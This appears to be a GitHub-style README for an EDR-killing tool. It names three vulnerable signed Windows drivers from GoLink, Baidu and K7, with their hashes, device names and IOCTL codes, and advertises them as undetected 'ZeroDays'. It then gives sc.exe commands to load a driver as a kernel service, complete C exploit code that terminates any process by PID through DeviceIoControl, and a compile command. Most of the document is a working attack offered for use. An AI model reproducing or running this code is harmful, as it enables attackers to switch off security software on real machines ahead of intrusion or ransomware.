# Funky Drivers

These drivers expose process termination APIs (e.g., `ZwTerminateProcess`) that can be used to terminate arbitrary processes (e.g. EDR). 
None of the drivers is flagged are malicious on VirusTotal. All vulnerabilities are "ZeroDays". 

## Driver 1 - GOLINK Software `GoFly.sys`

```
SHA256: 2FDFDD13A0C548BB68C9D5AA8599A9265D4659DA3E237FE7A42AC6AC06B9A06A
DeviceName: \\.\GoFly
IOCTL: 0x12227A
```

## Driver 2 - Baidu Antivirus `BdApiUtil.sys`

```
SHA256: 32198295D2A2700B9895FFF999C2B233F9BEFB0BC175815EC4B71EE926B6EDFC
DeviceName: \\.\BdApiUtil
IOCTL: 0x800024B4
```

## Driver 3 - K7 Antivirus `K7RKScan.sys`

```
SHA256: 5C6CE55A85F5D4640BD1485A72D0812BC4F5188EE966C5FE334248A7175D9040
DeviceName: \\.\DosK7RKScnDrv
IOCTL: 0x222018
```

## Exploit code

Create kernel service using one of the `.sys` drivers :

```Powershell
sc.exe create <ServiceName> binPath= <path.sys> type= kernel && sc.exe start <ServiceName>
```

Then compile and run exploit code with appropriate IOCTL / DeviceName

```C
#include <stdio.h>
#include <windows.h>

#define GETDAFUNK <IOCTL_HERE> // change this 

int main(void) {
  
	unsigned int pid;
	unsigned int res;
	DWORD lpBytesReturned = 0;

	HANDLE hDevice = CreateFileA("\\\\.\\<DeviceName here>", // change this
					GENERIC_WRITE|GENERIC_READ, 
					0, 
					NULL, 
					OPEN_EXISTING, 
					FILE_ATTRIBUTE_NORMAL, 
					NULL);
  
	if(hDevice == INVALID_HANDLE_VALUE){
		printf("[!] Connection to the driver failed\n");
		return -1;
	}
  
	printf("[+] Connected to driver\n");
	printf("[i] PID please : \n");
	scanf("%u", &pid);

	res = DeviceIoControl(hDevice, GETDAFUNK, &pid, sizeof(pid), NULL, 0, &lpBytesReturned, NULL);

	if (!res) {
		printf("[!] Funky IOCTL failed\n");
    		CloseHandle(hDevice);
    		return -1;
	}
  
	printf("[+] Process with PID : %u killed\n", pid);
	CloseHandle(hDevice);
  
	return 0;
}

```

```bash
x86_64-w64-mingw32-gcc -o Funkyller.exe exploit.c 
```
